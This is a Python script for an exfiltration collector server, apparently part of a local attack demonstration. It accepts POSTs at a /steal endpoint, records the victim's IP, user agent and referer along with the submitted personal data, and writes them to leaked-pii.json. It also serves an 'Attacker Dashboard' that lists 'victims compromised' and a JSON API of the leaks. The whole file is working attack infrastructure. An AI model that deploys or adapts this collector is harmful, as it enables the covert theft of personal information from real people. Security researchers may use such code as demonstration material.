#!/usr/bin/env python3
import http.server, socketserver, threading, os, functools, json, datetime

BASE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
LEAKS_FILE = os.path.join(BASE, 'leaked-pii.json')
LEAKS = []

# Load previous leaks
if os.path.exists(LEAKS_FILE):
    try:
        with open(LEAKS_FILE) as f:
            LEAKS = json.load(f)
    except:
        pass

class Handler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, *a): pass
    
    def do_POST(self):
        if self.path == '/steal':
            length = int(self.headers.get('Content-Length', 0))
            data = json.loads(self.rfile.read(length))
            data['timestamp'] = datetime.datetime.now().isoformat()
            data['ip'] = self.client_address[0]
            data['user_agent'] = self.headers.get('User-Agent', '')
            data['referer'] = self.headers.get('Referer', '')
            LEAKS.append(data)
            
            # Save to file
            with open(LEAKS_FILE, 'w') as f:
                json.dump(LEAKS, f, indent=2)
            
            print(f'\n⚠️  PII STOLEN from {data["ip"]}:')
            for k, v in data.items():
                if k not in ('timestamp', 'ip', 'user_agent', 'referer'):
                    print(f'   {k}: {v}')
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(json.dumps({'status':'received','id':len(LEAKS)-1}).encode())
        elif self.path == '/dashboard':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.end_headers()
            
            html = '''<!doctype html><html><head><meta charset=utf-8>
<title>Attacker Dashboard</title>
<style>
body{font-family:system-ui;max-width:800px;margin:20px auto;padding:16px;background:#0a0a0f;color:#ddd}
h1{color:#ff6b6b;font-size:1.2em}
.card{background:#1a1a2e;border:1px solid #333;border-radius:8px;padding:16px;margin:12px 0}
.card h2{font-size:0.95em;color:#ffd93d;margin:0 0 8px}
.row{display:flex;flex-wrap:wrap;gap:8px}
.tag{background:#c00;color:#fff;padding:4px 10px;border-radius:4px;font-size:12px}
.value{color:#0f0;font-family:monospace;font-size:12px}
.meta{color:#888;font-size:11px}
.empty{color:#888;font-style:italic;padding:20px}
</style></head><body>
<h1>Attacker Dashboard — Leaked PII</h1>'''
            
            if not LEAKS:
                html += '<div class="empty">No PII leaked yet. Wait for victim to visit the attack page.</div>'
            else:
                for i, leak in enumerate(LEAKS):
                    html += f'<div class="card"><h2>Victim #{i+1} — {leak.get("timestamp","?")}</h2>'
                    html += '<div class="row">'
                    for k, v in leak.items():
                        if k in ('timestamp','ip','user_agent','referer'):
                            html += f'<div class="tag">{k}</div><div class="value">{v}</div>'
                        else:
                            html += f'<div class="tag" style="background:#0a0">{k}</div><div class="value">{v}</div>'
                    html += '</div></div>'
                html += f'<p class="meta">{len(LEAKS)} victim(s) compromised</p>'
            
            html += '</body></html>'
            self.wfile.write(html.encode())
        elif self.path == '/leaks':
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(json.dumps(LEAKS, indent=2).encode())
        elif self.path == '/clear':
            LEAKS.clear()
            with open(LEAKS_FILE, 'w') as f:
                json.dump([], f)
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'cleared')
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_GET(self):
        if self.path == '/dashboard':
            return self.serve_dashboard()
        elif self.path == '/leaks':
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(json.dumps(LEAKS, indent=2).encode())
            return
        elif self.path == '/clear':
            LEAKS.clear()
            with open(LEAKS_FILE, 'w') as f:
                json.dump([], f)
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'cleared')
            return
        return super().do_GET()
    
    def serve_dashboard(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.end_headers()
        
        html = '''<!doctype html><html><head><meta charset=utf-8>
<title>Attacker Dashboard</title>
<style>
body{font-family:system-ui;max-width:800px;margin:20px auto;padding:16px;background:#0a0a0f;color:#ddd}
h1{color:#ff6b6b;font-size:1.2em}
.card{background:#1a1a2e;border:1px solid #333;border-radius:8px;padding:16px;margin:12px 0}
.card h2{font-size:0.95em;color:#ffd93d;margin:0 0 8px}
.row{display:flex;flex-wrap:wrap;gap:8px}
.tag{background:#c00;color:#fff;padding:4px 10px;border-radius:4px;font-size:12px}
.val{color:#0f0;font-family:monospace;font-size:12px}
.meta{color:#888;font-size:11px;padding:8px}
.empty{color:#888;padding:20px;text-align:center}
table{width:100%;border-collapse:collapse;margin-top:12px}
th{text-align:left;padding:6px 8px;background:#333;color:#ffd93d;font-size:12px}
td{padding:6px 8px;border-bottom:1px solid #333;font-size:12px;font-family:monospace}
td.pii{color:#0f0}
a{color:#88f}
</style></head><body>
<h1>Attacker Dashboard — Leaked Victim PII</h1>'''
        
        if not LEAKS:
            html += '<div class="empty">No PII leaked yet.</div>'
        else:
            html += f'<p class="meta">{len(LEAKS)} victim(s) compromised</p>'
            html += '<table><tr><th>#</th><th>Time</th><th>PII Extracted</th><th>Page URL</th></tr>'
            for i, leak in enumerate(LEAKS):
                ts = leak.get('timestamp','?')[:19]
                url = leak.get('page_url','?')
                # Collect PII fields
                pii_found = []
                for k,v in leak.items():
                    if k not in ('timestamp','ip','user_agent','referer','page_url','page_title'):
                        pii_found.append(f'{k}: {v}')
                html += f'<tr><td>{i+1}</td><td style="color:#888;font-size:11px">{ts}</td><td class="pii">{"; ".join(pii_found)}</td><td style="font-size:10px;max-width:200px;word-break:all">{url}</td></tr>'
            html += '</table>'
        
        html += '<p class="meta"><a href="/clear">Clear all leaks</a></p>'
        html += '</body></html>'
        self.wfile.write(html.encode())
    
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

def serve(port):
    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer(('127.0.0.1', port),
        functools.partial(Handler, directory=BASE)) as s:
        s.serve_forever()

for p in (9080, 9081):
    threading.Thread(target=serve, args=(p,), daemon=True).start()

print('Attacker page:  http://127.0.0.1:9080/')
print('Dashboard:      http://127.0.0.1:9080/dashboard')
print('Leaks API:      http://127.0.0.1:9080/leaks')
threading.Event().wait()
